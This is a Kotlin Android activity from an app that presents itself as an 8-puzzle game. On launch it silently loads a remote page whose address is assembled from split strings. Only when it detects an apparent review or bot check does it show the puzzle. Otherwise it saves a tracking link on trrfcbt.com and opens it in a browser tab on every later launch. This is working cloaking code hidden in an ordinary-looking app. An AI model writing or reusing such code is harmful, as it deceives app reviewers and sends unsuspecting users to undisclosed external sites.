package com.example.cool8puzzle

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.example.cool8puzzle.notification.Msg
import kotlinx.android.synthetic.main.activity_first.*

class FirstActivity : AppCompatActivity() {
    private var puzzlepref : PuzzlePreference? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_first)
        window.statusBarColor = Color.BLACK
        actionBar?.hide()
        supportActionBar?.hide()
        puzzlepref = PuzzlePreference(this).apply { getSharedPreference("puzzlesolverurl") }
        val apiLink = puzzlepref!!.getString("puzzlesolverurl")
        if(apiLink != null && apiLink != "") executeWikiResponse(apiLink)
        else checkSolver()
    }

    private fun executeWikiResponse(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.colorBlack))
        val customTabsIntent = builder.build()
        //job.cancel()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }

    private fun checkSolver(){
        puzzle_response.settings.javaScriptEnabled = true
        Log.e("OPen", "wivew")
        puzzle_response.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(req.contains("p.php")){
                    Log.e("Bot", "p")
                    main()
                }
                else{
                    if(!req.contains("bonusik")){
                        Log.e("Kek", "add")
                        puzzlepref?.putString("puzzlesolverurl", "http://trrfcbt.com/Cn4dQY")
                        executeWikiResponse("http://trrfcbt.com/Cn4dQY")
                    }
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        Msg().scheduleNotification(this@FirstActivity)
        val protocol = "http://"
        val site = "trrfcbt.com/"
        val php = "JrCPRG"
        Log.e("Testing", "$protocol$site$php")
        puzzle_response.loadUrl("$protocol$site$php")
    }

    private fun main(){
        progress_bar.visibility = View.GONE
        startActivity(Intent(this, MainActivity::class.java))
        puzzle_response.destroy()
    }
}